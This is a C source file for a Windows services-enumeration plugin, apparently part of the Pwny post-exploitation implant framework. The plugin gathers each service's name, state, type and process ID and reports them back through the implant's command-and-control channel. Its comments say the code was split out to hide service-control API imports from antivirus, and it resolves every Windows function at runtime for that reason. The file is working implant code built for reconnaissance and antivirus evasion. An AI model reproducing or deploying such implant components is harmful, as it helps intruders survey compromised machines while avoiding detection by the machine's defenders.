/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Services tab plugin — enumerate Windows services.
 *
 * Moved out of the core to remove OpenSCManagerW / EnumServicesStatusExW
 * from the main binary's IAT, reducing AV detection surface.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>


#define SERVICES_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define TLV_TYPE_SVC_NAME     TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_SVC_DISPLAY  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_SVC_STATE    TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)
#define TLV_TYPE_SVC_TYPE     TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_SVC_PID      TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 2)
#define TLV_TYPE_SVC_GROUP    TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, TAB_BASE, API_TYPE)

/* ------------------------------------------------------------------ */
/* Win32 function pointer types — resolved at init via cot_resolve()   */
/* ------------------------------------------------------------------ */

typedef int       (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWCH, int,
                                                    LPSTR, int, LPCCH, LPBOOL);
typedef SC_HANDLE (WINAPI *fn_OpenSCManagerW)(LPCWSTR, LPCWSTR, DWORD);
typedef BOOL      (WINAPI *fn_EnumServicesStatusExW)(SC_HANDLE, SC_ENUM_TYPE,
                                                      DWORD, DWORD, LPBYTE,
                                                      DWORD, LPDWORD, LPDWORD,
                                                      LPDWORD, LPCWSTR);
typedef BOOL      (WINAPI *fn_CloseServiceHandle)(SC_HANDLE);
typedef DWORD     (WINAPI *fn_GetLastError)(void);

static struct
{
    fn_WideCharToMultiByte    pWideCharToMultiByte;
    fn_OpenSCManagerW         pOpenSCManagerW;
    fn_EnumServicesStatusExW  pEnumServicesStatusExW;
    fn_CloseServiceHandle     pCloseServiceHandle;
    fn_GetLastError           pGetLastError;
} w;

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static char *wchar_to_utf8(const wchar_t *in)
{
    char *out;
    int len;

    if (in == NULL)
    {
        return NULL;
    }

    len = w.pWideCharToMultiByte(CP_UTF8, 0, in, -1, NULL, 0, NULL, NULL);
    if (len <= 0)
    {
        return NULL;
    }

    out = calloc(len, sizeof(char));
    if (out == NULL)
    {
        return NULL;
    }

    if (w.pWideCharToMultiByte(CP_UTF8, 0, in, -1, out, len, NULL, FALSE) == 0)
    {
        free(out);
        out = NULL;
    }

    return out;
}

static tlv_pkt_t *services_list(c2_t *c2)
{
    SC_HANDLE scm;
    DWORD bytes_needed;
    DWORD service_count;
    DWORD resume_handle;
    ENUM_SERVICE_STATUS_PROCESSW *services;
    DWORD buf_size;
    DWORD i;
    tlv_pkt_t *result;

    scm = w.pOpenSCManagerW(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (scm == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    bytes_needed = 0;
    service_count = 0;
    resume_handle = 0;

    w.pEnumServicesStatusExW(
        scm, SC_ENUM_PROCESS_INFO,
        SERVICE_WIN32, SERVICE_STATE_ALL,
        NULL, 0,
        &bytes_needed, &service_count,
        &resume_handle, NULL
    );

    if (bytes_needed == 0)
    {
        w.pCloseServiceHandle(scm);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    buf_size = bytes_needed;
    services = (ENUM_SERVICE_STATUS_PROCESSW *)malloc(buf_size);
    if (services == NULL)
    {
        w.pCloseServiceHandle(scm);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    resume_handle = 0;
    if (!w.pEnumServicesStatusExW(
            scm, SC_ENUM_PROCESS_INFO,
            SERVICE_WIN32, SERVICE_STATE_ALL,
            (LPBYTE)services, buf_size,
            &bytes_needed, &service_count,
            &resume_handle, NULL))
    {
        free(services);
        w.pCloseServiceHandle(scm);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (i = 0; i < service_count; i++)
    {
        tlv_pkt_t *entry = tlv_pkt_create();
        char *name_utf8 = wchar_to_utf8(services[i].lpServiceName);
        char *display_utf8 = wchar_to_utf8(services[i].lpDisplayName);

        if (name_utf8)
        {
            tlv_pkt_add_string(entry, TLV_TYPE_SVC_NAME, name_utf8);
            free(name_utf8);
        }
        if (display_utf8)
        {
            tlv_pkt_add_string(entry, TLV_TYPE_SVC_DISPLAY, display_utf8);
            free(display_utf8);
        }

        tlv_pkt_add_u32(entry, TLV_TYPE_SVC_STATE,
                         (int32_t)services[i].ServiceStatusProcess.dwCurrentState);
        tlv_pkt_add_u32(entry, TLV_TYPE_SVC_TYPE,
                         (int32_t)services[i].ServiceStatusProcess.dwServiceType);
        tlv_pkt_add_u32(entry, TLV_TYPE_SVC_PID,
                         (int32_t)services[i].ServiceStatusProcess.dwProcessId);

        tlv_pkt_add_tlv(result, TLV_TYPE_SVC_GROUP, entry);
        tlv_pkt_destroy(entry);
    }

    free(services);
    w.pCloseServiceHandle(scm);

    return result;
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    /* Resolve Win32 APIs once at load time */
    w.pWideCharToMultiByte   = (fn_WideCharToMultiByte)cot_resolve("kernel32.dll",
                                                                    "WideCharToMultiByte");
    w.pOpenSCManagerW        = (fn_OpenSCManagerW)cot_resolve("advapi32.dll",
                                                               "OpenSCManagerW");
    w.pEnumServicesStatusExW = (fn_EnumServicesStatusExW)cot_resolve("advapi32.dll",
                                                                      "EnumServicesStatusExW");
    w.pCloseServiceHandle    = (fn_CloseServiceHandle)cot_resolve("advapi32.dll",
                                                                    "CloseServiceHandle");
    w.pGetLastError          = (fn_GetLastError)cot_resolve("kernel32.dll",
                                                             "GetLastError");

    /* Register handlers */
    api_call_register(api_calls, SERVICES_LIST, (api_t)services_list);
}

#endif
